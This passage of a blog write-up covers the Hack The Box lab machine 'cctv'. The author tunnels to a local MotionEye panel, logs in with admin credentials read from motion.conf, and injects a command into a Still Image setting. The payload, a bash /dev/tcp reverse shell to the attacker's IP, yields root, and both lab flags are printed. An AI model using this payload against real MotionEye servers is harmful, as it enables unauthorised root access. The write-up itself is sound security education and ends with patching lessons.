+</span></span><span style="display:flex;"><span>Welcome to Ubuntu 24.04.4 LTS <span style="color:#f92672">(</span>GNU/Linux 6.8.0-111-generic x86_64<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Documentation:  https://help.ubuntu.com
+</span></span><span style="display:flex;"><span> * Management:     https://landscape.canonical.com
+</span></span><span style="display:flex;"><span> * Support:        https://ubuntu.com/pro
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> System information as of Fri <span style="color:#ae81ff">29</span> May 01:49:37 UTC <span style="color:#ae81ff">2026</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  System load:           0.0
+</span></span><span style="display:flex;"><span>  Usage of /:            79.0% of 8.70GB
+</span></span><span style="display:flex;"><span>  Memory usage:          26%
+</span></span><span style="display:flex;"><span>  Swap usage:            0%
+</span></span><span style="display:flex;"><span>  Processes:             <span style="color:#ae81ff">252</span>
+</span></span><span style="display:flex;"><span>  Users logged in:       <span style="color:#ae81ff">0</span>
+</span></span><span style="display:flex;"><span>  IPv4 address <span style="color:#66d9ef">for</span> eth0: 10.129.9.47
+</span></span><span style="display:flex;"><span>  IPv6 address <span style="color:#66d9ef">for</span> eth0: dead:beef::a0de:adff:fe4d:d6c3
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span> * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+</span></span><span style="display:flex;"><span>   just raised the bar <span style="color:#66d9ef">for</span> easy, resilient and secure K8s cluster deployment.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>Expanded Security Maintenance <span style="color:#66d9ef">for</span> Applications is not enabled.
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">144</span> updates can be applied immediately.
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">94</span> of these updates are standard security updates.
+</span></span><span style="display:flex;"><span>To see these additional updates run: apt list --upgradable
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">15</span> additional security updates can be applied with ESM Apps.
+</span></span><span style="display:flex;"><span>Learn more about enabling ESM Apps service at https://ubuntu.com/esm
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>The list of available updates is more than a week old.
+</span></span><span style="display:flex;"><span>To check <span style="color:#66d9ef">for</span> new updates run: sudo apt update
+</span></span><span style="display:flex;"><span>mark@cctv:~$ id
+</span></span><span style="display:flex;"><span>uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>mark<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>mark<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>mark<span style="color:#f92672">)</span>,24<span style="color:#f92672">(</span>cdrom<span style="color:#f92672">)</span>,30<span style="color:#f92672">(</span>dip<span style="color:#f92672">)</span>,46<span style="color:#f92672">(</span>plugdev<span style="color:#f92672">)</span> </span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>After popping a shell as <strong>mark</strong> on the target machine, I realized that I was a very low-privileged user. I couldn&rsquo;t access the <strong>user.txt</strong> flag, as it wasn&rsquo;t located in <strong>mark</strong>&rsquo;s home directory, but on a <em>different</em> user named <strong>sa_mark</strong> (which I assume stands for <em>superadmin</em> mark).<br>
+ <br>
+My current user didn&rsquo;t have any capabilities or SUID binaries that could be leveraged for privilege escalation. So, I decided to check for any running TCP services on the target that I didn&rsquo;t know about:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mark@cctv:~$ ss -tlnp
+</span></span><span style="display:flex;"><span>State  Recv-Q Send-Q  Local Address:Port    Peer Address:Port Process                                                       
+</span></span><span style="display:flex;"><span>LISTEN <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">4096</span>    127.0.0.53%lo:53           0.0.0.0:*                                                                  
+</span></span><span style="display:flex;"><span>LISTEN <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">70</span>          127.0.0.1:33060        0.0.0.0:*                                                                  
+</span></span><span style="display:flex;"><span>LISTEN <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">4096</span>        127.0.0.1:8554         0.0.0.0:*                                                                  
+</span></span><span style="display:flex;"><span>LISTEN <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">128</span>         127.0.0.1:8765         0.0.0.0:*                                                                  
+</span></span><span style="display:flex;"><span>LISTEN <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">4096</span>        127.0.0.1:8888         0.0.0.0:*                                                                  
+</span></span><span style="display:flex;"><span>LISTEN <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">4096</span>        127.0.0.1:9081         0.0.0.0:*                                                                  
+</span></span><span style="display:flex;"><span>LISTEN <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">151</span>         127.0.0.1:3306         0.0.0.0:*                                                                  
+</span></span><span style="display:flex;"><span>LISTEN <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">4096</span>       127.0.0.54:53           0.0.0.0:*                                                                  
+</span></span><span style="display:flex;"><span>LISTEN <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">4096</span>          0.0.0.0:22           0.0.0.0:*                                                                  
+</span></span><span style="display:flex;"><span>LISTEN <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">4096</span>        127.0.0.1:7999         0.0.0.0:*                                                                  
+</span></span><span style="display:flex;"><span>LISTEN <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">4096</span>        127.0.0.1:1935         0.0.0.0:*                                                                  
+</span></span><span style="display:flex;"><span>LISTEN <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">511</span>                 *:80                 *:*                                                                  
+</span></span><span style="display:flex;"><span>LISTEN <span style="color:#ae81ff">0</span>      <span style="color:#ae81ff">4096</span>             <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:22              <span style="color:#f92672">[</span>::<span style="color:#f92672">]</span>:* </span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>I used the <strong>curl -sv</strong> command on each of the ports to see if there were any interesting ones, and ended up hitting big on port <strong>8765</strong>.<br>
+As it turns out, this port is commonly used by the <strong>MotionEye</strong> service, a local web-based GUI for monitoring security cameras.<br>
+ <br>
+I went back to my attacker machine&rsquo;s terminal and used SSH to tunnel a connection from the target machine to my own:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# ssh -L 9999:127.0.0.1:8765 mark@cctv.htb</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>I was then able to visit the <strong>MotionEye</strong> panel by opening up a web browser and navigating to <strong>http://localhost:9999</strong>
+<img class="mx-auto my-6 rounded-md border border-gray-800/70 bg-black/20" src="/images/cctv/motioneye.png" loading="lazy" decoding="async"
+  alt="image of motioneye dashboard">
+I attempted to sign in with the credentials I used for <strong>mark</strong> on the target machine, but got denied. I then tried entering in default admin credentials, but still had no luck.<br>
+ <br>
+So, I went back to the terminal I had open on the target machine and searched for any directories that could be related to <strong>MotionEye</strong> in the hopes of finding credentials.</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mark@cctv:/$ find / -name <span style="color:#e6db74">&#34;motioneye&#34;</span> 2&gt;/dev/null
+</span></span><span style="display:flex;"><span>/run/motioneye
+</span></span><span style="display:flex;"><span>/var/lib/motioneye
+</span></span><span style="display:flex;"><span>/var/log/motioneye
+</span></span><span style="display:flex;"><span>/etc/motioneye
+</span></span><span style="display:flex;"><span>/usr/local/lib/python3.12/dist-packages/motioneye</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>I looked through the list of directories that came up and ended up finding plaintext credentials in <strong>/etc/motioneye</strong>!</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>mark@cctv:/etc/motioneye$ ls
+</span></span><span style="display:flex;"><span>camera-1.conf  motion.conf  motioneye.conf
+</span></span><span style="display:flex;"><span>mark@cctv:/etc/motioneye$ cat motion.conf 
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># @admin_username admin</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># @normal_username user</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># @lang en</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># @enabled on</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># @normal_password </span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>setup_mode off
+</span></span><span style="display:flex;"><span>webcontrol_port <span style="color:#ae81ff">7999</span>
+</span></span><span style="display:flex;"><span>webcontrol_interface <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>webcontrol_localhost on
+</span></span><span style="display:flex;"><span>webcontrol_parms <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>camera camera-1.conf</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>I went back to the admin panel in my web browser and tried out the admin credentials from the <strong>motion.conf</strong> file I found and was able to get succesfully logged in!
+<img class="mx-auto my-6 rounded-md border border-gray-800/70 bg-black/20" src="/images/cctv/motioneye2.png" loading="lazy" decoding="async"
+  alt="successful login to motioneye">
+From here, I explored the site to see if there were any vulnerabilities out in the open. I knew that if the <strong>MotionEye</strong> service was running as <strong>root</strong>, getting RCE would be the last step to pwning the machine.<br>
+ <br>
+By exploring the settings tab, I found the <strong>version</strong> that MotionEye was running. This was huge, because after doing some digging online, I came across a <strong>severe</strong> vulnerability that allowed RCE from the admin panel I was running on. This <a href="https://github.com/motioneye-project/motioneye/security/advisories/GHSA-j945-qm58-4gjx"><strong>GitHub advisory</strong></a> post explains the vulnerability in detail, along with a PoC.<br>
+ <br>
+Essentially, all an attacker has to do is:<br>
+ <br>
+Bypass client-side validation by manipulating a JS file in their browser:<br>
+<img class="mx-auto my-6 rounded-md border border-gray-800/70 bg-black/20" src="/images/cctv/clientside.png" loading="lazy" decoding="async"
+  alt="bypassing client-side validation">
+Then inject a payload into one of the MotionEye &ldquo;Still Image&rdquo; settings:<br>
+<img class="mx-auto my-6 rounded-md border border-gray-800/70 bg-black/20" src="/images/cctv/payload.png" loading="lazy" decoding="async"
+  alt="injecting payload">
+The payload used in order to get a reverse shell was:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#66d9ef">$(</span>python3 -c <span style="color:#e6db74">&#34;import os;os.system(&#39;bash -c \&#34;bash -i &gt;&amp; /dev/tcp/10.10.16.192/4444 0&gt;&amp;1\&#34;&#39;)&#34;</span><span style="color:#66d9ef">)</span>.%Y-%m-%d-%H-%M-%S</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><h2 id="privesc" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      <strong>PRIVESC</strong>
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<p>All that was left to do was set up a listener on my target machine:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# nc -lvnp <span style="color:#ae81ff">4444</span>  
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>Then, hit <strong>Apply</strong> on the MotionEye admin panel:
+<img class="mx-auto my-6 rounded-md border border-gray-800/70 bg-black/20" src="/images/cctv/apply.png" loading="lazy" decoding="async"
+  alt="hitting apply on the motioneye admin panel">
+After that, the rest was history.</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>root㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>/home/esteban/HackTheBox<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─# nc -lvnp <span style="color:#ae81ff">4444</span>  
+</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">4444</span> ...
+</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.16.192<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.129.9.47<span style="color:#f92672">]</span> <span style="color:#ae81ff">40052</span>
+</span></span><span style="display:flex;"><span>bash: cannot set terminal process group <span style="color:#f92672">(</span>3813<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+</span></span><span style="display:flex;"><span>bash: no job control in this shell
+</span></span><span style="display:flex;"><span>root@cctv:/etc/motioneye# </span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>I went ahead and grabbed the <strong>user.txt</strong> flag from <strong>/home/sa_mark</strong>:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@cctv:~# cd /home/sa_mark
+</span></span><span style="display:flex;"><span>root@cctv:/home/sa_mark# cat user.txt
+</span></span><span style="display:flex;"><span>245cfe65658229952c84b0c7af1770ca</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><p>And the <strong>root.txt</strong> flag from <strong>/root</strong>:</p>
+<div class="my-7 rounded-sm border border-gray-800/80 bg-black/40 overflow-hidden">
+  <div class="flex items-center justify-between px-4 py-2 border-b border-gray-800/70 bg-[#070709]">
+    <span class="text-xs uppercase tracking-widest text-gray-500">bash</span>
+    <span class="text-xs text-gray-600 font-mono">///</span>
+  </div>
+  <div class="codewrap overflow-x-auto">
+    <div class="p-4"><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@cctv:/home/sa_mark# cd /root
+</span></span><span style="display:flex;"><span>root@cctv:~# cat root.txt
+</span></span><span style="display:flex;"><span>4c330148025f5e90d7ce83ec72eb9b2a</span></span></code></pre></div></div>
+  </div>
+</div>
+<style>
+  .codewrap pre,
+  .codewrap .chroma { background: transparent !important; margin: 0 !important; }
+  .codewrap pre { padding: 0 !important; overflow: visible !important; }
+  .codewrap code { background: transparent !important; border: 0 !important; padding: 0 !important; font-size: 0.95rem; line-height: 1.55; color: rgba(229, 231, 235, 0.92); }
+  .codewrap { background: rgba(0,0,0,0.20); }
+</style><h2 id="takeaways" class="mt-8 mb-3 text-xl sm:text-2xl text-white">
+    <span class="relative inline-block">
+      <strong>TAKEAWAYS</strong>
+      <span
+        class="absolute left-0 -bottom-1 h-px w-0 bg-indigo-400"></span>
+    </span>
+</h2>
+<p>This machine highlighted the importance of keeping web services up to date and keeping credentials hashed. Since the ZoneMinder version was easily exploitable with SQL injection, extracting and cracking password hashes was easy. To make it worse, the MotionEye version running on the machine was also outdated, allowing for remote code execution <em>and</em> a root shell.</p>
+
+        </div>
+      </div>
+
+      
+    </article>
+
+    <div class="hidden lg:block col-span-2"></div>
+  </div>
+</main>
+
+      </div>
+
+    </div>
+  </main>
+
+  <footer>
+    <div class="border-t border-gray-800 bg-[#070709] text-gray-400">
+  <div class="max-w-6xl mx-auto px-4 sm:px-6">
+    <div class="flex flex-col md:flex-row items-center justify-between py-6 space-y-4 md:space-y-0">
+
+      
+      <div class="text-sm sm:text-base md:text-lg">
+        <span class="relative inline-block">
+          © 2026 Esteban Pangelinan. All rights reserved. <br>
+          Made with <a href="https://gohugo.io" target="_blank">Hugo</a> | <a
+            href="https://github.com/Enerhim/enervoid-theme" target="_blank">Enervoid</a>
+        </span>
+      </div>
+
+      
+      <div class="flex items-center space-x-6 text-sm sm:text-base md:text-lg">
+
+        
+        <a href='https://github.com/est706' target="_blank" rel="noopener"
+          class="group relative inline-block transition-colors duration-200 hover:text-gray-200">
+          
+          <i class="devicon-github-original"></i>
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </a>
+        
+        <a href='https://www.linkedin.com/in/esteban-pangelinan-385249210/' target="_blank" rel="noopener"
+          class="group relative inline-block transition-colors duration-200 hover:text-gray-200">
+          
+          <i class="devicon-linkedin-plain"></i>
+          <span
+            class="absolute left-0 -bottom-1 h-[2px] w-0 bg-indigo-400 transition-all duration-300 group-hover:w-full"></span>
+        </a>
+        
+
+      </div>
+    </div>
+  </div>
+</div>
+
+  </footer>
+</body>
+
+</html>
